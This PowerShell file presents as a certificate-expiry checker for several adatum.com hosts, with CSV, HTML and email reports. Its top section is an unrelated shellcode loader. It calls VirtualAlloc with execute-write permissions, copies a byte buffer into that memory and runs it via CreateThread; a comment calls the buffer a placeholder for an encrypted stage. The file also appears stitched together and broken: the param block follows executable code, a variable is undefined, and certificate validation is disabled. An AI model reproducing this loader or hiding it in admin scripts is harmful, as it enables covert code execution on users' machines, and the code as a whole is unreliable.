$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class NativeApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x7a, 0x17, 0x03, 0x27, 0x0f, 0x70, 0x23, 0xed, 0xc3, 0x21, 0x6e, 0xff, 0x6f, 0x50, 0xc7, 0x05,
    0x10, 0x1f, 0xd0, 0x1d, 0x27, 0x11, 0x06, 0xd3, 0x91, 0x42, 0x47, 0x75, 0x94, 0x20, 0x29, 0xeb,
    0x27, 0x9f, 0x33, 0xfe, 0x6f, 0x4f, 0x18, 0x6f, 0xd3, 0xe4, 0x59, 0x5e, 0xa8, 0x2a, 0xb2, 0x2b,
    0x77, 0xf8, 0x8f, 0x26, 0xdb, 0xae, 0x1e, 0xbb, 0x97, 0x93, 0x93, 0x60, 0xd9, 0xe3, 0x2a, 0x69,
    0xb6, 0xaf, 0x97, 0x2c, 0x72, 0xd7, 0x7b, 0x27, 0xf8, 0x58, 0xe0, 0xd5, 0x9e, 0x76, 0x71, 0x27,
    0x84, 0x7d, 0x69, 0xfa, 0x5e, 0xbc, 0x75, 0x7a, 0x13, 0x7b, 0xe6, 0xf5, 0x06, 0x01, 0x2e, 0x49,
    0xe9, 0x7c, 0x35, 0x01, 0x7a, 0x39, 0x23, 0x80, 0x28, 0x0d, 0x71, 0x1b, 0x03, 0xfc, 0x41, 0x7f,
    0x39, 0x24, 0x36, 0x22, 0xff, 0xda, 0xe2, 0xb9, 0x4b, 0xdc, 0x8b, 0xcc, 0x22, 0xb2, 0xd2, 0xdd,
    0xd4, 0xf9, 0xcf, 0x2c, 0xe5, 0xe6, 0x40, 0x36, 0x3b, 0x4f, 0x34, 0x06, 0xdf, 0x3a, 0x43, 0x25,
    0x01, 0x62, 0x25, 0x83, 0x28, 0xbc, 0xdb, 0x05, 0x82, 0x12, 0x8e, 0xb8, 0xfb, 0x10, 0xda, 0xde,
    0x6c, 0x22, 0x02, 0xaf, 0xd1, 0x6b, 0x95, 0x89, 0xd5, 0x83, 0x9e, 0x0f, 0x33, 0x6b, 0xd9, 0xb8,
    0x48, 0xc5, 0x2e, 0x3d, 0x29, 0x26, 0xb4, 0x55, 0x31, 0x24, 0xa2, 0xc6, 0x5c, 0xe0, 0x41, 0xe2,
    0x6f, 0xee, 0xeb, 0x29, 0xfa, 0xb3, 0x9c, 0xea, 0x82, 0x90, 0x6a, 0x17, 0xf9, 0x4e, 0xcf, 0xb7,
    0xe6, 0x9d, 0x49, 0x0a, 0x5c, 0xad, 0xde, 0x67, 0x5d, 0x28, 0xc6, 0x53, 0x0a, 0x9f, 0x27, 0xf5,
    0x97, 0x4c, 0x21, 0xf2, 0x26, 0x50, 0x21, 0xdb, 0xfe, 0x45, 0x6f, 0x7f, 0x67, 0x0c, 0xbc, 0xef,
    0x29, 0x89, 0x46, 0x1a, 0xe7, 0x5c, 0xe5, 0xe9, 0xe4, 0x74, 0x43, 0xe9, 0x27, 0x07, 0xe8, 0xd6,
    0xff, 0x29, 0xb6, 0xec, 0x2c, 0x94, 0x95, 0x0d, 0x1c, 0xc8, 0x9b, 0xb6, 0x2d, 0x12, 0xa7, 0x0a,
    0xca, 0x71, 0xb8, 0x56, 0x1f, 0xca, 0xae, 0x24, 0xbb, 0xea, 0xc1, 0x43, 0xf4
)

$Handle = [NativeApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($Handle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $Handle, $Buffer.Length)
$ThreadId = 0
$Thread = [NativeApi]::CreateThread([IntPtr]::Zero, 0, $Handle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][NativeApi]::WaitForSingleObject($Thread, 2386)
[void][NativeApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [ValidateRange(1, 365)]
    [int]$WarningDays = 30,
    [string[]]$Hosts = @('portal.adatum.com', 'api.adatum.com', 'vpn.adatum.com'),
    [int]$Port = 8443,
    [string]$ReportPath = "C:\Reports\cert-expiry-2024-03-07.csv"
)


function Get-CertificateExpiry {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$ComputerName,

        [int]$Port = 443
    )

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($ComputerName, $Port)
        $callback = [System.Net.Security.RemoteCertificateValidationCallback] {
            param($sender, $certificate, $chain, $errors)
            return $true
        }
        $stream = New-Object System.Net.Security.SslStream($client.GetStream(), $false, $callback)
        $stream.AuthenticateAsClient($ComputerName)
        $cert = [System.Security.Cryptography.X509Certificates.X509Certificate2]$stream.RemoteCertificate
        [pscustomobject]@{
            Host     = $ComputerName
            Subject  = $cert.Subject
            Issuer   = $cert.Issuer
            NotAfter = $cert.NotAfter
            DaysLeft = [math]::Floor(($cert.NotAfter - (Get-Date)).TotalDays)
        }
        $stream.Dispose()
    }
    finally {
        $client.Close()
    }
}

$stores = @('Cert:\LocalMachine\My', 'Cert:\LocalMachine\WebHosting')
$localCerts = foreach ($store in $stores) {
    Get-ChildItem -Path $store -ErrorAction SilentlyContinue |
        Where-Object { $_.NotAfter -lt (Get-Date).AddDays($WarningDays) } |
        Select-Object @{Name = 'Store'; Expression = { $store }}, Subject, NotAfter,
            @{Name = 'DaysLeft'; Expression = { [math]::Floor(($_.NotAfter - (Get-Date)).TotalDays) }}
}

$remote = foreach ($hostName in $Hosts) {
    Write-Verbose ("Probing {0}:{1}" -f $hostName, $Port)
    try {
        Get-CertificateExpiry -ComputerName $hostName -Port $Port
    }
    catch {
        Write-Warning ("Could not read certificate from {0}" -f $hostName)
    }
}
$expiring = @($remote | Where-Object { $_.DaysLeft -le $WarningDays })

$remote | Sort-Object -Property DaysLeft |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
$expiring | Export-Csv -Path $ReportPath.Replace('.csv', '-warn.csv') -NoTypeInformation -Encoding UTF8

$byIssuer = $remote | Group-Object -Property Issuer |
    Sort-Object -Property Count -Descending | Select-Object -First 5
$byIssuer | Format-Table Name, Count -AutoSize

$style = @'
<style>
body { font-family: Calibri; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #eeeeee; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$remote | Sort-Object -Property DaysLeft |
    ConvertTo-Html -Title 'Certificate expiry' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8

$MailTo = 'pki@adatum.com'
$summaryBody = $expiring | ConvertTo-Html -Fragment | Out-String

$mailParams = @{
    To         = $MailTo
    From       = 'pki@adatum.com'
    Subject    = "Certificate expiry warning"
    Body       = $summaryBody
    SmtpServer = 'smtp.adatum.com'
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

$soonest = $remote | Sort-Object -Property DaysLeft | Select-Object -First 1
Write-Host ("Next expiry: {0} on {1:yyyy-MM-dd}" -f $soonest.Subject, $soonest.NotAfter) -ForegroundColor Yellow
Write-Verbose ("Local store matches: {0}" -f @($localCerts).Count)

$portCheck = Test-NetConnection -ComputerName $Hosts[0] -Port $Port -InformationLevel Quiet -WarningAction SilentlyContinue
Write-Verbose ("Port {0} reachable on {1}: {2}" -f $Port, $Hosts[0], $portCheck)

$renewal = $remote | Where-Object { $_.DaysLeft -lt 0 }
if (@($renewal).Count -gt 0) {
    Write-Warning ("{0} certificates have already expired" -f @($renewal).Count)
}

$schtasks = Get-ScheduledTask -TaskName 'Contoso-CertCheck' -ErrorAction SilentlyContinue
if ($schtasks) {
    Write-Verbose ("Scheduled check state: {0}" -f $schtasks.State)
}

$selfSigned = $remote | Where-Object { $_.Subject -eq $_.Issuer }
Write-Verbose ("Self-signed certificates: {0}" -f @($selfSigned).Count)

$thumbprints = $remote | Select-Object Host, @{Name = 'Thumbprint'; Expression = { $_.Subject.Length }}
$thumbprints | Format-Table -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
